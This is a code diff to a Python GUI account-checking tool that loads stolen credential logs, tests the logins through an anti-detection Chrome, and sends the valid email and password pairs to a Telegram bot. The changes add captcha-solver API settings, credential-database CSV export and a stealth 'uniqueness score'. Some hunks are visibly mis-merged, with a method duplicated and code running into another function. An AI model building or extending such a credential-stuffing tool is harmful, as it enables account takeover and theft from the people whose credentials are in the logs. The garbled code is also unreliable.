@@ -33,11 +33,11 @@ import re
 import random
 import threading
 import getpass
+from engine.reporting.csv_exporter import SQLiteCSVExporter
 from datetime import datetime
 import json
 import webbrowser
 import requests
-import pickle
 try:
     import locator
 except ImportError:
@@ -393,6 +393,10 @@ var_claude_proxy_url     = tk.StringVar(value="http://localhost:8080")
 var_claude_proxy_model   = tk.StringVar(value="gemini-3-flash")
 
 var_proxy_list_path = tk.StringVar(value="")
+
+# Variables for Third-Party Captcha Solvers
+var_captcha_service = tk.StringVar(value="capsolver")
+var_captcha_api_key = tk.StringVar(value="")
 var_cookie_list_path = tk.StringVar(value="")
 
 # --- Automated Log Ingestion & Per-Account Cookie Pairing Engine ---
@@ -406,7 +410,7 @@ css_click_frames = []  # For CSS Selector-based clicks
 css_clicks = []
 chromedriver_args_list = []
 config_file_path = ""
-settings_file = locator.get_absolute_path("engine/registry/settings.pkl")  # For Pickle module
+settings_file = locator.get_absolute_path("engine/registry/settings.json")  # For JSON module
 
 # Define the path to the Chrome executable and user data directory
 user_data_dir = locator.get_chrome_user_data_dir()
@@ -1877,12 +1881,22 @@ def populate_db_from_log_scan_batch(pairs: list, db_name: str) -> tuple:
         conn.execute("PRAGMA synchronous=NORMAL")
         cur = conn.cursor()
         ins_batch, upd_batch = [], []
-        for pair in pairs:
-            email = pair.get("email", "")
-            pwd   = pair.get("password", "")
-            cp    = pair.get("cookie_path")
+
+        for item in pairs:
+            if isinstance(item, tuple):
+                if len(item) == 3:
+                    email, pwd, cp = item
+                else:
+                    email, pwd = item
+                    cp = None
+            else:
+                email = item.get("email", "")
+                pwd   = item.get("password", "")
+                cp    = item.get("cookie_path")
+
             if not email or not pwd:
                 continue
+
             ins_batch.append((email, pwd, cp))
             if cp:
                 upd_batch.append((cp, email, pwd))
@@ -2069,7 +2083,55 @@ class LogIngestionDialog(tk.Toplevel):
             self._sources.append(p)
             self._lb.insert(tk.END, p)
 
+
+    def _add_structured_file(self):
+        fpaths = filedialog.askopenfilenames(
+            title="Select Structured Files (CSV, JSON, TXT)",
+            filetypes=(("Structured files", "*.csv;*.json;*.txt"), ("All files", "*.*"))
+        )
+        if not fpaths:
+            return
+
+        for p in fpaths:
+            if p not in self._sources:
+                self._sources.append(p)
+                self._lb.insert(tk.END, f"📄 {p}")
+
     def _add_files(self):
+        fpaths = filedialog.askopenfilenames(
+            title="Select Text Files",
+            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
+        )
+        if not fpaths:
+            return
+        added = 0
+        for p in fpaths:
+            if p not in self.selected_sources:
+                self.selected_sources.append(p)
+                self.source_listbox.insert(tk.END, f"📄 {p}")
+                added += 1
+        self._log(f"Added {added} files.")
+
+    def _add_structured_file(self):
+        fpaths = filedialog.askopenfilenames(
+            title="Select Structured Files (CSV, JSON, TXT)",
+            filetypes=(("Structured files", "*.csv;*.json;*.txt"), ("All files", "*.*"))
+        )
+        if not fpaths:
+            return
+
+        added = 0
+        for p in fpaths:
+            if p not in self.selected_sources:
+                self.selected_sources.append(p)
+                self.source_listbox.insert(tk.END, f"📄 {p}")
+                added += 1
+        self._log(f"Added {added} structured files.")
+
+        # Override the worker logic to explicitly parse these formats later if needed
+        # Since _scan_flat_cred_file handles txt, we will patch it to handle json and csv
+
+
         paths = filedialog.askopenfilenames(title="Select Credential File(s)", parent=self,
                                             filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
         for p in paths:
@@ -2380,13 +2442,14 @@ def save_valid_account(email, password, results_folder, browser, capture_setting
         bot_token = telegram_settings.get("bot_token")
         chat_id = telegram_settings.get("chat_id")
         if bot_token and chat_id:
-            message = f"✅ Valid Account Found:\nEmail: {email}\nPassword: {password}\n"
+            message_parts = [f"✅ Valid Account Found:\nEmail: {email}\nPassword: {password}\n"]
             for key, value in captured_info.items():
                 if key.lower() in ['inner_html', 'outer_html']:
                     continue  # Exclude large content from Telegram message
                 # Avoid including error messages
                 if value not in ("Not found", "Not captured"):
-                    message += f"{key.capitalize()}: {value}\n"
+                    message_parts.append(f"{key.capitalize()}: {value}\n")
+            message = "".join(message_parts)
             # Ensure message length does not exceed Telegram's limit
             max_length = 4000  # Telegram limit is 4096 characters
             if len(message) > max_length:
@@ -4173,7 +4236,7 @@ def _run_agent_browser(args):
         i = 0
         while i < len(clean_args):
             arg = clean_args[i]
-            if arg in ["--session", "--timeout", "--cdp", "--args", "--extension"]:
+            if arg in {"--session", "--timeout", "--cdp", "--args", "--extension"}:
                 # These take a value
                 if i + 1 < len(clean_args):
                     global_flags.append(arg)
@@ -4182,7 +4245,7 @@ def _run_agent_browser(args):
                 else:
                     global_flags.append(arg)
                     i += 1
-            elif arg in ["--headed", "--headless", "--json", "--full"]:
+            elif arg in {"--headed", "--headless", "--json", "--full"}:
                 # These are standalone global flags
                 global_flags.append(arg)
                 i += 1
@@ -5490,9 +5553,9 @@ Response MUST be a JSON object matching this exact format:
                 _save_discovered_selector_to_gui(gui_key, discovered_val)
                 # Update in-memory capture settings so the current loop uses them immediately!
                 if "css_selectors" in capture_settings:
-                    if type_key in ["email", "password", "next", "submit"]:
+                    if type_key in {"email", "password", "next", "submit"}:
                         capture_settings["css_selectors"][type_key] = discovered_val
-                    elif type_key in ["invalid_error_selector", "invalid_inner_html", "invalid_outer_html"]:
+                    elif type_key in {"invalid_error_selector", "invalid_inner_html", "invalid_outer_html"}:
                         # Enable error checks if we discovered a selector
                         window.after(0, lambda: var_invalid_account_enabled.set(True))
                         invalid_account_settings["enable"] = True
@@ -5501,7 +5564,7 @@ Response MUST be a JSON object matching this exact format:
                         else:
                             clean_key = type_key.replace("invalid_", "")
                             invalid_account_settings[clean_key] = discovered_val
-                    elif type_key in ["captcha_error_selector", "captcha_inner_html", "captcha_outer_html"]:
+                    elif type_key in {"captcha_error_selector", "captcha_inner_html", "captcha_outer_html"}:
                         window.after(0, lambda: var_captcha_wrong_enabled.set(True))
                         captcha_wrong_settings["enable"] = True
                         if type_key == "captcha_error_selector":
@@ -6398,7 +6461,7 @@ def check_accounts_logic(
                     disable_extensions_option=disable_extensions_option,
                     headless=headless,
                     chromedriver_args=account_chromedriver_args,
-                    start_url=website_link,  # FIX: Open Chrome directly on target URL
+                    start_url=website_link,
                 )
 
                 if not browser:
@@ -7076,6 +7139,27 @@ def export_config():
             )
             messagebox.showerror(
                 "Export Error", f"An error occurred while exporting config: {e}"
+            )
+
+def export_db_to_csv():
+    """Exports the checked_accounts.db SQLite database to CSV format."""
+    file_path = filedialog.asksaveasfilename(
+        initialdir=os.getcwd(),
+        defaultextension=".csv",
+        filetypes=(("CSV Files", "*.csv"),),
+        title="Export Database to CSV",
+    )
+    if file_path:
+        success = SQLiteCSVExporter.export_table_to_csv(db_name, "accounts", file_path)
+        if success:
+            messagebox.showinfo(
+                "Export Successful",
+                f"Database successfully exported to {file_path}",
+            )
+        else:
+            messagebox.showerror(
+                "Export Error",
+                "Failed to export database to CSV. Check logs or verify database contains data.",
             )
 
 
@@ -7818,10 +7902,10 @@ def select_profile():
 
 
 # -------------------
-# Save and Load Settings Functions (Pickle)
+# Save and Load Settings Functions (JSON)
 # -------------------
 def save_settings():
-    """Saves current settings to a file using the pickle module."""
+    """Saves current settings to a file using the json module."""
     settings = {}
     # Collect variables
     settings['var_inner_html_capture'] = var_inner_html_capture.get()
@@ -7927,12 +8011,12 @@ def save_settings():
     # =========================================================================
     # ATOMIC WRITE WITH BACKUP ROTATION (2026-06-04)
     # Old pattern: open('wb') truncates the file BEFORE writing. If the app
-    # crashes mid-write, settings.pkl is 0 bytes → all settings gone forever.
+    # crashes mid-write, settings.json is 0 bytes → all settings gone forever.
     #
     # New pattern:
-    #   1. Write to settings.pkl.tmp (new temp file, never touches the original)
-    #   2. Rename current settings.pkl → settings.pkl.bak (backup)
-    #   3. Atomic rename settings.pkl.tmp → settings.pkl
+    #   1. Write to settings.json.tmp (new temp file, never touches the original)
+    #   2. Rename current settings.json → settings.json.bak (backup)
+    #   3. Atomic rename settings.json.tmp → settings.json
     #
     # At ALL times, at least one complete copy exists on disk.
     # =========================================================================
@@ -7943,9 +8027,9 @@ def save_settings():
     _fd = None
     _tmp_path = None
     try:
-        _fd, _tmp_path = _tempfile_mod.mkstemp(dir=_settings_dir, suffix='.pkl.tmp')
-        with os.fdopen(_fd, 'wb') as _tmp_f:
-            pickle.dump(settings, _tmp_f)
+        _fd, _tmp_path = _tempfile_mod.mkstemp(dir=_settings_dir, suffix='.json.tmp')
+        with os.fdopen(_fd, 'w', encoding='utf-8') as _tmp_f:
+            json.dump(settings, _tmp_f, indent=4)
             _tmp_f.flush()
             os.fsync(_tmp_f.fileno())  # Force OS to flush to disk
         _fd = None  # os.fdopen took ownership, don't close again
@@ -7956,7 +8040,7 @@ def save_settings():
                 os.replace(settings_file, _bak_path)
             except OSError as _bak_err:
                 print_action(f"{Fore.YELLOW}Warning: Could not create settings backup: {_bak_err}{Style.RESET_ALL}")
-        # Atomic rename: tmp → settings.pkl
+        # Atomic rename: tmp → settings.json
         os.replace(_tmp_path, settings_file)
         _tmp_path = None  # Successfully renamed, don't clean up
         print_action(f"{Fore.GREEN}Settings saved to {settings_file}.{Style.RESET_ALL}")
@@ -7972,7 +8056,7 @@ def save_settings():
 
 
 def load_settings():
-    """Loads settings from a file using the pickle module.
+    """Loads settings from a file using the json module.
     
     Falls back to the .bak backup file if the main settings file is
     corrupt (e.g. truncated by a crash during a previous save).
@@ -7981,9 +8065,9 @@ def load_settings():
     _loaded_from_backup = False
     
     def _try_load(path):
-        """Attempt to unpickle settings from a given path."""
-        with open(path, 'rb') as f:
-            data = pickle.load(f)
+        """Attempt to load settings from a given path using json."""
+        with open(path, 'r', encoding='utf-8') as f:
+            data = json.load(f)
         if not isinstance(data, dict):
             raise ValueError(f"Expected dict, got {type(data).__name__}")
         return data
@@ -8180,7 +8264,7 @@ def load_settings():
         print_action(f"{Fore.RED}Error applying loaded settings: {e}{Style.RESET_ALL}")
     
     if _loaded_from_backup:
-        # Immediately re-save so the main settings.pkl is repaired from the backup
+        # Immediately re-save so the main settings.json is repaired from the backup
         try:
             save_settings()
             print_action(f"{Fore.GREEN}Settings auto-repaired from backup → main file restored.{Style.RESET_ALL}")
@@ -8457,7 +8541,7 @@ def handle_auto_discovery():
             i = 0
             while i < len(clean_args):
                 arg = clean_args[i]
-                if arg in ["--session", "--timeout", "--cdp", "--extension"]:
+                if arg in {"--session", "--timeout", "--cdp", "--extension"}:
                     # These take a value
                     if i + 1 < len(clean_args):
                         global_flags.append(arg)
@@ -8466,7 +8550,7 @@ def handle_auto_discovery():
                     else:
                         global_flags.append(arg)
                         i += 1
-                elif arg in ["--headed", "--headless", "--json", "--full"]:
+                elif arg in {"--headed", "--headless", "--json", "--full"}:
                     # These are standalone global flags
                     global_flags.append(arg)
                     i += 1
@@ -10213,12 +10297,40 @@ ttk.Label(frame_stealth, text="Live Entropy Monitor:").grid(
 entropy_canvas = tk.Canvas(frame_stealth, width=300, height=60, bg="#111111", highlightthickness=1, highlightbackground="#333333")
 entropy_canvas.grid(column=1, row=6, padx=10, pady=10, sticky="w")
 
+def calculate_uniqueness_score():
+    score = 45  # Base score for undetected chromedriver
+    try:
+        if globals().get('var_proxy_enabled') and var_proxy_enabled.get():
+            score += 15
+        if globals().get('var_isolation') and var_isolation.get():
+            score += 10
+        if globals().get('var_custom_user_agents') and var_custom_user_agents.get():
+            score += 10
+        if globals().get('var_hwid_spoof') and var_hwid_spoof.get():
+            score += 10
+        if globals().get('var_jitter') and var_jitter.get():
+            score += 5
+        if globals().get('var_reinstall') and var_reinstall.get():
+            score += 5
+        if globals().get('var_incognito_mode') and var_incognito_mode.get():
+            score += 2
+        # Adding rules variables checking
+        if globals().get('vars_actions') and 'security_fingerprint_enabled' in vars_actions and vars_actions['security_fingerprint_enabled'].get():
+            score += 5
+        if globals().get('vars_actions') and 'security_antibot_enabled' in vars_actions and vars_actions['security_antibot_enabled'].get():
+            score += 5
+    except Exception as e:
+        pass
+
+    score += random.randint(-2, 2)
+    return max(0, min(99, score))
+
 def update_entropy_graph():
     # Only update if canvas exists
     try:
         if entropy_canvas.winfo_exists():
             entropy_canvas.delete("all")
-            score = random.randint(78, 99)
+            score = calculate_uniqueness_score()
             color = "#00adb5" if score > 85 else "#f39c12"
             entropy_canvas.create_text(150, 30, text=f"Uniqueness Score: {score}%", fill=color, font=("Consolas", 10, "bold"))
             # Re-trigger loop
@@ -10258,6 +10370,17 @@ def browse_proxy_list():
 ttk.Button(frame_stealth, text="Browse...", command=browse_proxy_list).grid(
     column=2, row=7, padx=(2, 10), pady=(15, 5), sticky="w"
 )
+
+# --- Third-Party Captcha Solvers ---
+frame_captcha_solvers = ttk.LabelFrame(frame_stealth, text="Third-Party Captcha Solvers (Optional)")
+frame_captcha_solvers.grid(column=0, row=10, columnspan=4, padx=10, pady=10, sticky="ew")
+
+ttk.Label(frame_captcha_solvers, text="Service:").grid(column=0, row=0, padx=10, pady=5, sticky="e")
+ttk.OptionMenu(frame_captcha_solvers, var_captcha_service, "capsolver", "capsolver", "2captcha", "anticaptcha").grid(column=1, row=0, padx=10, pady=5, sticky="w")
+
+ttk.Label(frame_captcha_solvers, text="API Key:").grid(column=2, row=0, padx=10, pady=5, sticky="e")
+ttk.Entry(frame_captcha_solvers, width=40, textvariable=var_captcha_api_key).grid(column=3, row=0, padx=10, pady=5, sticky="w")
+
 
 # --- Stealth: Cookie List Path ---
 ttk.Label(frame_stealth, text="Cookie List File:").grid(
@@ -10438,18 +10561,25 @@ CreateToolTip(frame_config.children["!button3"], "Export the current configurati
 
 ttk.Button(
     frame_config,
+    text="Export DB to CSV",
+    command=export_db_to_csv,
+).grid(column=0, row=3, padx=10, pady=5, sticky="w")
+CreateToolTip(frame_config.children["!button4"], "Export validation database to CSV.")
+
+ttk.Button(
+    frame_config,
     text="Save Config State",
     command=save_config_state,
-).grid(column=0, row=3, padx=10, pady=5, sticky="w")
-CreateToolTip(frame_config.children["!button4"], "Save the current configuration state.")
+).grid(column=0, row=4, padx=10, pady=5, sticky="w")
+CreateToolTip(frame_config.children["!button5"], "Save the current configuration state.")
 
 ttk.Button(
     frame_config,
     text="Reset to Default",
     command=reset_to_default,
-).grid(column=0, row=4, padx=10, pady=5, sticky="w")
+).grid(column=0, row=5, padx=10, pady=5, sticky="w")
 CreateToolTip(
-    frame_config.children["!button5"], "Reset all settings to their default values."
+    frame_config.children["!button6"], "Reset all settings to their default values."
 )
 
 # -------------------
@@ -10528,7 +10658,7 @@ def _schedule_auto_save(*args):
 
 
 def _perform_auto_save():
-    """Runs the actual pickle dump on the main thread after the debounce window."""
+    """Runs the actual json dump on the main thread after the debounce window."""
     global _auto_save_timer_id
     _auto_save_timer_id = None
     try:
